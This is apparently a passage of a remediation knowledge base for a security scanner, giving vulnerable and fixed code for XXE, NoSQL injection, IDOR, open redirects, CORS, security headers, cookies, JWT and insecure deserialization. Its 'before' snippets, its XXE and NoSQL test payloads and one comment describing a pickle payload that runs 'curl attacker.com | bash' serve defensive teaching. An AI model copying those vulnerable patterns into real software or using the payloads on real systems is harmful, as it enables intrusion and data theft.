libxml_set_external_entity_loader(null);      // PHP 8+
libxml_disable_entity_loader(true);           // PHP < 8

$xml = simplexml_load_string(
    $userXml,
    "SimpleXMLElement",
    LIBXML_NONET | LIBXML_NOENT | LIBXML_NOCDATA
);
if ($xml === false) {
    http_response_code(400);
    exit("Invalid XML");
}
?>
''',
            },
            'Node.js · xml2js / fast-xml-parser': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE — some parsers expand entities by default
const xml2js = require("xml2js");
xml2js.parseString(userXml, (err, result) => res.json(result));
''',
                'after': '''\
// ✅ FIXED — Use fast-xml-parser with entity processing disabled
// npm install fast-xml-parser
const { XMLParser } = require("fast-xml-parser");
const parser = new XMLParser({
  processEntities: false,   // no entity expansion
  allowBooleanAttributes: false,
});
const result = parser.parse(userXml);

// ✅ Also: reject XML with DOCTYPE declarations
if (/<(!DOCTYPE|!ENTITY)/i.test(userXml)) {
  return res.status(400).json({ error: "DOCTYPE not allowed" });
}
''',
            },
        },
        'verify': (
            'POST the following XML body and verify the response does NOT contain /etc/passwd:\n'
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
        ),
        'references': [
            'https://portswigger.net/web-security/xxe',
            'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
            'https://github.com/tiran/defusedxml',
        ],
    },

    # ── 9. NOSQL INJECTION ──────────────────────────────────────────────────
    'NoSQL Injection': {
        'summary': (
            'NoSQL injection exploits MongoDB, Redis, or other NoSQL databases by injecting '
            'operator objects like {"$ne": null} or {"$gt": ""} into query parameters, '
            'bypassing authentication or extracting all records.'
        ),
        'impact': (
            '🔴 CRITICAL — Authentication bypass (login as any user), full collection dump, '
            'account takeover.'
        ),
        'steps': [
            '1. Validate that values are the expected primitive type (string/int), not objects.',
            '2. Sanitize operator characters ($, .) from user-controlled keys and values.',
            '3. Use an ODM (Mongoose) with strict schemas to reject unexpected types.',
            '4. Never directly spread request.body into a MongoDB query.',
        ],
        'patches': {
            'Node.js · MongoDB / Mongoose': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE — spreads body directly into query
app.post("/login", async (req, res) => {
  const user = await User.findOne(req.body);  // body = { "$ne": null } → dumps DB
});
''',
                'after': '''\
// ✅ FIXED — extract and validate individual typed fields
const { sanitize } = require("mongo-sanitize");  // npm i mongo-sanitize
const bcrypt = require("bcrypt");

app.post("/login", async (req, res) => {
  const email    = sanitize(String(req.body.email    || ""));
  const password = sanitize(String(req.body.password || ""));

  const user = await User.findOne({ email });   // typed query, not spread
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: "Invalid credentials" });
  }
  // ... issue token
});
''',
            },
            'Python · pymongo': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — dict from request body used directly
data = request.json
user = db.users.find_one(data)   # {"$ne": null} finds first user
''',
                'after': '''\
# ✅ FIXED — explicit field extraction + type casting
import re

def safe_str(val, max_len=256) -> str:
    s = str(val or "")[:max_len]
    # Strip NoSQL operator characters
    return re.sub(r"[\\$\\.]", "", s)

email    = safe_str(request.json.get("email"))
password = request.json.get("password", "")

user = db.users.find_one({"email": email})   # only the email field in query
if not user or not check_password(password, user["password_hash"]):
    return jsonify({"error": "Invalid credentials"}), 401
''',
            },
            'Mongoose · Schema validation': {
                'lang': 'javascript',
                'before': '''\
// ❌ No type enforcement
const UserSchema = new mongoose.Schema({ email: {}, password: {} });
''',
                'after': '''\
// ✅ FIXED — strict types prevent operator objects
const UserSchema = new mongoose.Schema({
  email:         { type: String, required: true, maxlength: 254 },
  passwordHash:  { type: String, required: true },
  createdAt:     { type: Date,   default: Date.now },
}, {
  strict: true,          // rejects fields not in schema
  strictQuery: true,     // Mongoose 7+ default — rejects unknown query keys
});
''',
            },
        },
        'verify': (
            'POST {"email": {"$ne": null}, "password": {"$ne": null}} — '
            'should get 401 Unauthorized, not 200 with a user token.'
        ),
        'references': [
            'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection',
            'https://www.npmjs.com/package/mongo-sanitize',
        ],
    },

    # ── 10. IDOR / BOLA ─────────────────────────────────────────────────────
    'IDOR': {
        'summary': (
            'Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA) '
            'occurs when an API exposes object IDs without verifying the requesting user '
            'is authorized to access that specific object.'
        ),
        'impact': (
            '🟠 HIGH — Horizontal privilege escalation: any user can read/modify/delete '
            'another user\'s data by changing a numeric ID. Ranked #1 in OWASP API Security Top 10.'
        ),
        'steps': [
            '1. NEVER authorize by ID alone — always check that the owner field matches the authenticated user.',
            '2. Replace predictable sequential IDs with UUIDs (v4) to prevent enumeration.',
            '3. Implement a centralized authorization middleware applied to every route.',
            '4. Log and alert on access attempts that return 403 (may indicate enumeration).',
        ],
        'patches': {
            'Python · Flask (ownership check)': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — anyone with a valid JWT can access any order
@app.route("/api/orders/<int:order_id>")
@auth_required
def get_order(order_id):
    order = db.fetch_one("SELECT * FROM orders WHERE id = %s", (order_id,))
    return jsonify(order)   # No ownership check!
    # Attack: GET /api/orders/9999 → reads another user\'s order
''',
                'after': '''\
# ✅ FIXED — add ownership WHERE clause + 404 on miss (not 403, to prevent enumeration)
@app.route("/api/orders/<int:order_id>")
@auth_required
def get_order(order_id):
    user_id = request.auth_user["sub"]   # from JWT
    order = db.fetch_one(
        "SELECT * FROM orders WHERE id = %s AND user_id = %s",
        (order_id, user_id)
        # ↑ ownership enforced at the SQL level
    )
    if not order:
        abort(404)   # Return 404, not 403 (avoid confirming object exists)
    return jsonify(order)
''',
            },
            'Node.js · Express + Prisma': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE
app.get("/api/documents/:id", authenticate, async (req, res) => {
  const doc = await prisma.document.findUnique({ where: { id: +req.params.id } });
  res.json(doc);   // No userId check
});
''',
                'after': '''\
// ✅ FIXED — Prisma where clause enforces ownership
app.get("/api/documents/:id", authenticate, async (req, res) => {
  const doc = await prisma.document.findFirst({
    where: {
      id:     parseInt(req.params.id, 10),
      userId: req.user.id,   // auth middleware sets req.user
    },
  });
  if (!doc) return res.status(404).json({ error: "Not found" });
  res.json(doc);
});
''',
            },
            'UUID replacement (enumeration mitigation)': {
                'lang': 'sql',
                'before': '''\
-- ❌ Sequential IDs allow enumeration
CREATE TABLE orders (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  ...
);
''',
                'after': '''\
-- ✅ UUIDs prevent enumeration — attacker can\'t guess valid IDs
CREATE TABLE orders (
  id   CHAR(36) PRIMARY KEY DEFAULT (gen_random_uuid()),
  -- MySQL: UUID()  |  SQLite: lower(hex(randomblob(4)))||...
  user_id INTEGER NOT NULL REFERENCES users(id),
  ...
);

-- Application:
-- Python: import uuid; str(uuid.uuid4())
-- Node.js: require("crypto").randomUUID()
''',
            },
            'Centralized Auth Middleware · Express': {
                'lang': 'javascript',
                'before': '''\
// ❌ Authorization logic scattered and inconsistent across routes
''',
                'after': '''\
// ✅ Centralized ownership middleware
function ownedBy(model) {
  return async (req, res, next) => {
    const record = await model.findFirst({
      where: { id: req.params.id, userId: req.user.id },
    });
    if (!record) return res.status(404).json({ error: "Not found" });
    req.resource = record;   // attach for route handler use
    next();
  };
}

// Usage:
app.get("/api/invoices/:id", authenticate, ownedBy(prisma.invoice), (req, res) => {
  res.json(req.resource);   // ownership already verified by middleware
});
''',
            },
        },
        'verify': (
            'Log in as User A. Call GET /api/orders/<User B\'s order ID>. '
            'Should get 404 Not Found. Also try changing the Authorization header to '
            'another user\'s token — the results must differ.'
        ),
        'references': [
            'https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/',
            'https://portswigger.net/web-security/access-control/idor',
        ],
    },

    # ── 11. OPEN REDIRECT ───────────────────────────────────────────────────
    'Open Redirect': {
        'summary': (
            'An open redirect allows attackers to craft a link on your trusted domain '
            'that silently forwards users to a malicious site, enabling phishing, '
            'OAuth token theft, and bypassing SSRF filters.'
        ),
        'impact': (
            '🟡 MEDIUM — Phishing pages hosted under your brand, OAuth token exfiltration, '
            'and used as a stepping stone in SSRF filter bypass chains.'
        ),
        'steps': [
            '1. Use a safe redirect helper that validates the destination is on the same host.',
            '2. Never trust a redirect URL from query parameters for sensitive flows.',
            '3. For post-login redirects, store the originally-requested path in the session (server-side).',
            '4. If redirecting to partner sites is needed, use a signed/tokenized redirect parameter.',
        ],
        'patches': {
            'Python · Flask': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — blindly redirects to user-supplied URL
from flask import redirect, request
@app.route("/login")
def login():
    # ... verify credentials ...
    next_url = request.args.get("next", "/")
    return redirect(next_url)   # Attack: ?next=https://evil.com
''',
                'after': '''\
# ✅ FIXED — validate redirect stays on same host
from flask import redirect, request, abort, session
from urllib.parse import urlparse, urljoin

def is_safe_redirect(url: str) -> bool:
    """Return True only if url is a relative path on our own host."""
    try:
        target = urlparse(urljoin(request.host_url, url))
        base   = urlparse(request.host_url)
        # Must have same scheme + netloc, or be a plain relative path
        return (
            not target.netloc or          # relative URL
            target.netloc == base.netloc  # same host
        )
    except Exception:
        return False

@app.route("/login", methods=["POST"])
def login():
    # ... verify credentials ...
    next_url = request.args.get("next", "/dashboard")
    if not is_safe_redirect(next_url):
        next_url = "/dashboard"   # silently fall back to default
    return redirect(next_url)
''',
            },
            'Node.js · Express': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE
app.get("/login", (req, res) => {
  // ... auth ...
  res.redirect(req.query.next);
});
''',
                'after': '''\
// ✅ FIXED — parse and validate
const { URL } = require("url");

function safeRedirect(res, url, fallback = "/") {
  try {
    const parsed = new URL(url, "https://" + process.env.HOST);
    // Reject if the host differs from our own
    if (parsed.hostname !== process.env.HOST) url = fallback;
  } catch {
    url = fallback;   // malformed URL → fall back
  }
  res.redirect(url);
}

app.get("/login", (req, res) => {
  // ... auth ...
  safeRedirect(res, req.query.next || "/");
});
''',
            },
            'Session-based redirect (most secure)': {
                'lang': 'python',
                'before': '''\
# ❌ Query-parameter approach is always spoofable
''',
                'after': '''\
# ✅ Store the intended URL in the session before redirecting to login
from flask import session, redirect, url_for, request

@app.before_request
def require_login():
    if not is_authenticated() and request.endpoint != "login":
        session["next"] = request.path   # safe: server-side session, not user-controlled
        return redirect(url_for("login"))

@app.route("/login", methods=["POST"])
def login():
    # ... verify credentials ...
    next_path = session.pop("next", "/dashboard")
    # next_path came from OUR code, not from user input
    return redirect(next_path)
''',
            },
        },
        'verify': (
            'Test: GET /login?next=https://evil.com — after login should redirect to /dashboard. '
            'Test: GET /login?next=//evil.com — same. '
            'GET /login?next=/settings — should succeed (relative path is fine).'
        ),
        'references': [
            'https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html',
            'https://portswigger.net/kb/issues/00500100_open-redirection-reflected',
        ],
    },

    # ── 12. CORS MISCONFIGURATION ───────────────────────────────────────────
    'CORS Misconfiguration': {
        'summary': (
            'A misconfigured CORS policy (wildcard origin, reflected origin, or null origin '
            'trusted) allows attacker-controlled pages to make authenticated cross-origin '
            'API calls and read the responses, bypassing the same-origin policy.'
        ),
        'impact': (
            '🟠 HIGH — If credentials (cookies/tokens) are included and CORS is too permissive, '
            'attackers can exfiltrate user data, account details, and session tokens from '
            'authenticated users who visit the attacker\'s page.'
        ),
        'steps': [
            '1. Maintain an explicit allowlist of permitted origins — never reflect arbitrary origins.',
            '2. Never combine Access-Control-Allow-Origin: * with Allow-Credentials: true (browsers block it, but broken libs don\'t).',
            '3. Set the Vary: Origin header so caches handle CORS correctly.',
            '4. Never trust the "null" origin in production.',
        ],
        'patches': {
            'Python · Flask': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — reflects any arbitrary Origin
from flask_cors import CORS
CORS(app)   # sets Access-Control-Allow-Origin: *  or reflects everything
''',
                'after': '''\
# ✅ FIXED — explicit allowlist, NOT reflected
from flask import request

ALLOWED_ORIGINS = {
    "https://app.mysite.com",
    "https://mysite.com",
}

@app.after_request
def cors_headers(response):
    origin = request.headers.get("Origin", "")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"]      = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
        response.headers["Access-Control-Allow-Headers"]     = "Content-Type, Authorization"
        response.headers["Access-Control-Allow-Methods"]     = "GET, POST, PUT, DELETE, OPTIONS"
        response.headers["Vary"]                             = "Origin"
    return response

@app.route("/api/<path:path>", methods=["OPTIONS"])
def options_handler(path):
    return "", 204
''',
            },
            'Node.js · Express + cors package': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE — wildcard or origin reflection
const cors = require("cors");
app.use(cors());                            // *
app.use(cors({ origin: true }));           // reflect everything
app.use(cors({ origin: req.headers.origin })); // same problem
''',
                'after': '''\
// ✅ FIXED — strict allowlist
const cors = require("cors");

const ALLOWED = new Set([
  "https://app.mysite.com",
  "https://mysite.com",
]);

app.use(cors({
  origin: (origin, cb) => {
    // Allow server-to-server (no Origin header) from internal tools only
    if (!origin || ALLOWED.has(origin)) {
      cb(null, true);
    } else {
      cb(new Error(`CORS: origin ${origin} not allowed`));
    }
  },
  credentials: true,
  methods: ["GET", "POST", "PUT", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
}));
''',
            },
            'Nginx': {
                'lang': 'nginx',
                'before': '''\
# ❌ Reflects any Origin
add_header Access-Control-Allow-Origin $http_origin;
add_header Access-Control-Allow-Credentials true;
''',
                'after': '''\
# ✅ Map-based allowlist in nginx.conf
geo $allowed_origin {
    default "";
    include /etc/nginx/cors-origins.conf;
}
# cors-origins.conf contains: "https://app.mysite.com" "https://app.mysite.com";

server {
    location /api/ {
        if ($http_origin ~* "^https://(app\\.mysite\\.com|mysite\\.com)$") {
            add_header Access-Control-Allow-Origin  $http_origin always;
            add_header Access-Control-Allow-Credentials "true" always;
            add_header Vary "Origin" always;
        }
    }
}
''',
            },
        },
        'verify': (
            'curl -H "Origin: https://evil.com" -H "Cookie: session=abc" '
            'https://api.mysite.com/api/profile\n'
            'Response should NOT have Access-Control-Allow-Origin: https://evil.com — '
            'no header or a 403 is expected.'
        ),
        'references': [
            'https://portswigger.net/web-security/cors',
            'https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html',
        ],
    },

    # ── 13. SECURITY HEADERS ────────────────────────────────────────────────
    'Missing Security Headers': {
        'summary': (
            'HTTP security headers instruct the browser on security policies. Missing '
            'headers like CSP, HSTS, X-Frame-Options, and X-Content-Type-Options '
            'expose users to XSS amplification, clickjacking, and downgrade attacks.'
        ),
        'impact': (
            '🟡 MEDIUM-HIGH — Enables clickjacking, MIME sniffing exploits, script '
            'injection amplification, and HTTP→HTTPS downgrade attacks (MITM).'
        ),
        'steps': [
            '1. Add all security headers in a single middleware / server config block.',
            '2. Test headers at https://securityheaders.com after deployment.',
            '3. Start with CSP in report-only mode, then enforce once you have a clean policy.',
            '4. Enable HSTS preloading after confirming HTTPS works across all subdomains.',
        ],
        'patches': {
            'Python · Flask (middleware)': {
                'lang': 'python',
                'before': '''\
# ❌ No security headers — default Flask responses
app = Flask(__name__)
''',
                'after': '''\
# ✅ Comprehensive security headers via after_request hook
from flask import Flask

app = Flask(__name__)

@app.after_request
def set_security_headers(response):
    # Clickjacking protection
    response.headers["X-Frame-Options"]           = "DENY"
    # Prevent MIME type sniffing
    response.headers["X-Content-Type-Options"]    = "nosniff"
    # Deprecated but still supported in older browsers
    response.headers["X-XSS-Protection"]         = "1; mode=block"
    # Force HTTPS — add preload after testing
    response.headers["Strict-Transport-Security"] = (
        "max-age=31536000; includeSubDomains; preload"
    )
    # Control what the page can load (tighten per-app as needed)
    response.headers["Content-Security-Policy"]  = (
        "default-src \'self\'; "
        "script-src \'self\'; "
        "style-src \'self\' \'unsafe-inline\'; "
        "img-src \'self\' data: https:; "
        "font-src \'self\' https://fonts.gstatic.com; "
        "frame-ancestors \'none\';"
    )
    response.headers["Referrer-Policy"]          = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"]        = (
        "geolocation=(), microphone=(), camera=()"
    )
    # Remove version disclosure
    response.headers.pop("Server", None)
    response.headers.pop("X-Powered-By", None)
    return response
''',
            },
            'Node.js · Helmet.js': {
                'lang': 'javascript',
                'before': '''\
// ❌ No headers
const express = require("express");
const app = express();
''',
                'after': '''\
// ✅ Helmet handles all major headers automatically
// npm install helmet
const helmet = require("helmet");
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc:  ["\'self\'"],
      scriptSrc:   ["\'self\'"],
      styleSrc:    ["\'self\'", "\'unsafe-inline\'"],
      imgSrc:      ["\'self\'", "data:", "https:"],
      frameAncestors: ["\'none\'"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
}));
// Hide X-Powered-By
app.disable("x-powered-by");
''',
            },
            'Nginx (server block)': {
                'lang': 'nginx',
                'before': '''\
# ❌ No headers in nginx.conf
''',
                'after': '''\
# ✅ Add to your server {} block in nginx.conf
server {
    server_tokens off;          # hide Nginx version

    add_header X-Frame-Options              "DENY"                                   always;
    add_header X-Content-Type-Options       "nosniff"                                always;
    add_header X-XSS-Protection            "1; mode=block"                           always;
    add_header Strict-Transport-Security   "max-age=31536000; includeSubDomains; preload" always;
    add_header Content-Security-Policy     "default-src \'self\'; frame-ancestors \'none\';"  always;
    add_header Referrer-Policy             "strict-origin-when-cross-origin"          always;
    add_header Permissions-Policy          "geolocation=(), microphone=(), camera=()" always;
}
''',
            },
            'Apache (.htaccess)': {
                'lang': 'apache',
                'before': '''\
# ❌ No security headers
''',
                'after': '''\
# ✅ .htaccess — requires mod_headers
<IfModule mod_headers.c>
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    Header always set Content-Security-Policy "default-src \'self\'; frame-ancestors \'none\';"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
    Header unset Server
    Header unset X-Powered-By
</IfModule>
ServerTokens Prod
ServerSignature Off
''',
            },
        },
        'verify': (
            'Visit https://securityheaders.com and enter your URL. '
            'Target: A rating (all 6 main headers present). '
            'Also check DevTools → Network → any page → Response Headers.'
        ),
        'references': [
            'https://owasp.org/www-project-secure-headers/',
            'https://securityheaders.com',
            'https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html',
        ],
    },

    # ── 14. COOKIE SECURITY ─────────────────────────────────────────────────
    'Cookie Security': {
        'summary': (
            'Session cookies without HttpOnly, Secure, or SameSite flags can be stolen '
            'by XSS (HttpOnly missing), transmitted over plain HTTP (Secure missing), '
            'or used in CSRF attacks (SameSite missing).'
        ),
        'impact': (
            '🟠 HIGH — Session hijacking and full account takeover, even if the application '
            'has no other vulnerabilities.'
        ),
        'steps': [
            '1. Set HttpOnly=true on ALL session cookies.',
            '2. Set Secure=true when serving over HTTPS.',
            '3. Set SameSite=Strict (or Lax for OAuth flows).',
            '4. Set a reasonable expiry and Max-Age.',
            '5. Name cookies with __Secure- or __Host- prefix for additional browser enforcement.',
        ],
        'patches': {
            'Python · Flask': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — no security flags
@app.route("/login", methods=["POST"])
def login():
    token = generate_session_token()
    resp  = make_response(redirect("/dashboard"))
    resp.set_cookie("session", token)   # no HttpOnly, Secure, SameSite
    return resp
''',
                'after': '''\
# ✅ FIXED — all security flags + Flask config
@app.route("/login", methods=["POST"])
def login():
    token = generate_session_token()
    resp  = make_response(redirect("/dashboard"))
    resp.set_cookie(
        "__Host-session",      # __Host- prefix: must be Secure, path=/, no Domain
        token,
        httponly  = True,       # JS cannot access via document.cookie
        secure    = True,       # HTTPS only
        samesite  = "Strict",   # no cross-site sending
        max_age   = 3600,       # 1 hour
        path      = "/",
    )
    return resp

# Set globally in app config:
app.config.update(
    SESSION_COOKIE_HTTPONLY = True,
    SESSION_COOKIE_SECURE   = True,
    SESSION_COOKIE_SAMESITE = "Strict",
    PERMANENT_SESSION_LIFETIME = 3600,
)
''',
            },
            'PHP': {
                'lang': 'php',
                'before': '''\
<?php
// ❌ VULNERABLE — no flags
setcookie("PHPSESSID", session_id());
?>
''',
                'after': '''\
<?php
// ✅ FIXED — all flags including SameSite (PHP 7.3+)
session_set_cookie_params([
    "lifetime" => 3600,
    "path"     => "/",
    "domain"   => "yourdomain.com",
    "secure"   => true,
    "httponly" => true,
    "samesite" => "Strict",
]);
session_name("__Secure-SESS");
session_start();
?>
''',
            },
            'Node.js · express-session': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE — default session settings
app.use(session({ secret: "s3cr3t", resave: false, saveUninitialized: true }));
''',
                'after': '''\
// ✅ FIXED — all security options
const session = require("express-session");

app.use(session({
  name:   "__Host-sid",            // __Host- prefix for extra security
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,         // don\'t create session until needed
  cookie: {
    httpOnly: true,
    secure:   process.env.NODE_ENV === "production",  // enforce HTTPS in prod
    sameSite: "strict",
    maxAge:   3600 * 1000,          // 1 hour in ms
  },
}));
''',
            },
        },
        'verify': (
            'DevTools → Application → Cookies: check each session cookie has HttpOnly✓, Secure✓, '
            'SameSite=Strict✓. Also try: document.cookie in the browser console — '
            'session cookie should NOT appear.'
        ),
        'references': [
            'https://owasp.org/www-community/controls/SecureCookieAttribute',
            'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html',
        ],
    },

    # ── 15. JWT WEAKNESS ────────────────────────────────────────────────────
    'JWT Weakness': {
        'summary': (
            'JWT tokens signed with the "none" algorithm, weak HS256 secrets, or missing '
            'expiry allow attackers to forge tokens and impersonate any user, including admins.'
        ),
        'impact': (
            '🔴 CRITICAL — Full account takeover, privilege escalation to admin, '
            'bypassing authentication entirely.'
        ),
        'steps': [
            '1. Always verify the algorithm matches what your server expects — never accept "none".',
            '2. Switch from HS256 (symmetric, secret must be shared) to RS256 (asymmetric key-pair).',
            '3. Generate a cryptographically random secret of at least 256 bits for HS256.',
            '4. Set a short expiry (exp claim) and implement refresh token rotation.',
            '5. Maintain a token revocation list or use short-lived tokens.',
        ],
        'patches': {
            'Python · PyJWT': {
                'lang': 'python',
                'before': '''\
# ❌ VULNERABLE — accepts any algorithm including "none"
import jwt
payload = jwt.decode(token, options={"verify_signature": False})
# OR
payload = jwt.decode(token, SECRET, algorithms=None)  # trusts header
''',
                'after': '''\
# ✅ FIXED — RS256 with public key, explicit algorithm list
import jwt, os
from pathlib import Path

# Generate keys once: openssl genrsa -out private.pem 2048
#                     openssl rsa -in private.pem -pubout -out public.pem
PRIVATE_KEY = Path("private.pem").read_text()
PUBLIC_KEY  = Path("public.pem").read_text()

def issue_token(user_id: int) -> str:
    return jwt.encode(
        {"sub": str(user_id), "exp": datetime.utcnow() + timedelta(minutes=15)},
        PRIVATE_KEY, algorithm="RS256"
    )

def verify_token(token: str) -> dict:
    return jwt.decode(
        token,
        PUBLIC_KEY,
        algorithms=["RS256"],   # ONLY RS256 — "none" is rejected
        options={"require": ["exp", "sub"]}
    )
''',
            },
            'Node.js · jsonwebtoken': {
                'lang': 'javascript',
                'before': '''\
// ❌ VULNERABLE — weak secret + no algorithm enforcement
const jwt = require("jsonwebtoken");
const SECRET = "secret";                          // ← guessable

app.post("/login", (req, res) => {
  const token = jwt.sign({ userId: user.id }, SECRET);  // no exp!
  res.json({ token });
});

app.use((req, res, next) => {
  const payload = jwt.verify(req.headers.authorization, SECRET);
  // algorithms not specified → accepts "none"!
  next();
});
''',
                'after': '''\
// ✅ FIXED — RS256 key-pair + expiry + strict algorithm
const jwt  = require("jsonwebtoken");
const fs   = require("fs");

const PRIV = fs.readFileSync("private.pem");
const PUB  = fs.readFileSync("public.pem");

// Issue (only on login server)
function issueToken(userId) {
  return jwt.sign(
    { sub: userId.toString(), iat: Math.floor(Date.now() / 1000) },
    PRIV,
    { algorithm: "RS256", expiresIn: "15m" }
  );
}

// Verify (on every protected route)
function verifyToken(token) {
  return jwt.verify(token, PUB, {
    algorithms: ["RS256"],   // strict — "none" and HS* are rejected
    issuer:     "api.mysite.com",
  });
}

// Refresh token pattern
function issueRefreshToken(userId) {
  return jwt.sign({ sub: userId, type: "refresh" }, PRIV,
    { algorithm: "RS256", expiresIn: "7d" });
}
''',
            },
            'Java · JJWT': {
                'lang': 'java',
                'before': '''\
// ❌ VULNERABLE — weak key
String secret = "mysecret";
Claims claims = Jwts.parser().setSigningKey(secret).parseClaimsJws(token).getBody();
''',
                'after': '''\
// ✅ FIXED — RSA 2048 key-pair, explicit algorithm
import io.jsonwebtoken.*;
import java.security.*;

KeyPairGenerator kpg = KeyPairGenerator.getInstance("RSA");
kpg.initialize(2048);
KeyPair kp = kpg.generateKeyPair();   // persist to keystore in production

// Sign
String token = Jwts.builder()
    .setSubject(userId.toString())
    .setExpiration(Date.from(Instant.now().plus(15, ChronoUnit.MINUTES)))
    .signWith(kp.getPrivate(), SignatureAlgorithm.RS256)
    .compact();

// Verify
try {
    Claims claims = Jwts.parserBuilder()
        .setSigningKey(kp.getPublic())  // public key only — cannot forge
        .build()
        .parseClaimsJws(token)
        .getBody();
} catch (JwtException e) {
    throw new UnauthorizedException("Invalid token: " + e.getMessage());
}
''',
            },
        },
        'verify': (
            'Decode your JWT at jwt.io. The header should show "alg":"RS256", not "none" or "HS256". '
            'Try sending a JWT with "alg":"none" and empty signature — server should return 401. '
            'Also verify exp is set and tokens expire within 15 minutes.'
        ),
        'references': [
            'https://portswigger.net/web-security/jwt',
            'https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html',
            'https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/',
        ],
    },

    # ── 16. INSECURE DESERIALIZATION ────────────────────────────────────────
    'Insecure Deserialization': {
        'summary': (
            'Insecure deserialization occurs when an application deserializes attacker-controlled '
            'data without verification, allowing the attacker to manipulate objects and '
            'in many languages trigger arbitrary code execution through gadget chains.'
        ),
        'impact': (
            '🔴 CRITICAL — Remote Code Execution, privilege escalation, denial of service '
            '(billion-laughs). Exploited in Apache Struts (Equifax), Jenkins, WebLogic breaches.'
        ),
        'steps': [
            '1. Never deserialize data from untrusted sources (user input, cookies, request body).',
            '2. Replace pickle/PHP serialize/Java ObjectInputStream with JSON or protobuf for data transfer.',
            '3. If serialization is required, sign the payload with HMAC and verify before deserializing.',
            '4. Run deserialization in a sandboxed environment with no filesystem/network access.',
        ],
        'patches': {
            'Python · Replace pickle with JSON': {
                'lang': 'python',
                'before': '''\
# ❌ CRITICAL — pickle from user input = arbitrary code execution
import pickle, base64
data   = request.cookies.get("cart")
cart   = pickle.loads(base64.b64decode(data))
# Attack: craft a pickle payload that calls os.system("curl attacker.com | bash")
''',
                'after': '''\
# ✅ FIXED — Use JSON + HMAC signature to prevent tampering
import json, hmac, hashlib, base64, os

SECRET = os.environ["CART_SECRET"].encode()

def sign_cart(cart_dict: dict) -> str:
    payload = json.dumps(cart_dict, separators=(",",":")).encode()
    sig     = hmac.new(SECRET, payload, hashlib.sha256).hexdigest()
    return base64.b64encode(payload).decode() + "." + sig

def verify_cart(signed: str) -> dict:
    try:
        b64, sig = signed.rsplit(".", 1)
        payload  = base64.b64decode(b64)
        expected = hmac.new(SECRET, payload, hashlib.sha256).hexdigest()
        if not hmac.compare_digest(expected, sig):
            raise ValueError("Signature mismatch")
        return json.loads(payload)
    except Exception:
        return {}   # tampering detected — return empty cart

cart = verify_cart(request.cookies.get("cart", "."))
''',
            },
            'Java · ObjectInputStream hardening': {
                'lang': 'java',
                'before': '''\
// ❌ VULNERABLE — raw ObjectInputStream is universal exploit gateway
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();   // gadget chain RCE possible
''',
                'after': '''\
// ✅ FIXED — Use Jackson JSON instead of Java serialization
import com.fasterxml.jackson.databind.ObjectMapper;

// Replace binary deserialization with JSON
ObjectMapper mapper = new ObjectMapper();
mapper.activateDefaultTyping(               // deny arbitrary type names
    mapper.getPolymorphicTypeValidator(),
    ObjectMapper.DefaultTyping.NONE
);
MyDTO dto = mapper.readValue(request.getInputStream(), MyDTO.class);

// If you MUST use ObjectInputStream, use a deserialization filter (Java 9+):
ObjectInputStream ois = new ObjectInputStream(stream) {{
    setObjectInputFilter(info -> {
        if (info.serialClass() != null &&
            !ALLOWED_CLASSES.contains(info.serialClass().getName()))
            return ObjectInputFilter.Status.REJECTED;
        return ObjectInputFilter.Status.ALLOWED;
    });
}};
''',
            },
            'PHP · Replace serialize() with JSON': {
                'lang': 'php',
                'before': '''\
<?php
// ❌ VULNERABLE — unserialize from cookie
$data = unserialize(base64_decode($_COOKIE["session_data"]));
?>
''',
                'after': '''\
<?php
// ✅ FIXED — JSON + HMAC
$secret = $_ENV["SESSION_SECRET"];

function signedEncode(array $data, string $secret): string {
    $json = json_encode($data);
    $sig  = hash_hmac("sha256", $json, $secret);
    return base64_encode($json) . "." . $sig;
}

function signedDecode(string $token, string $secret): ?array {
    [$b64, $sig] = explode(".", $token, 2) + [null, null];
    $json = base64_decode($b64 ?? "");
    if (!hash_equals(hash_hmac("sha256", $json, $secret), $sig ?? ""))
        return null;   // tampered
    return json_decode($json, true);
}

$data = signedDecode($_COOKIE["session_data"] ?? ".", $secret);
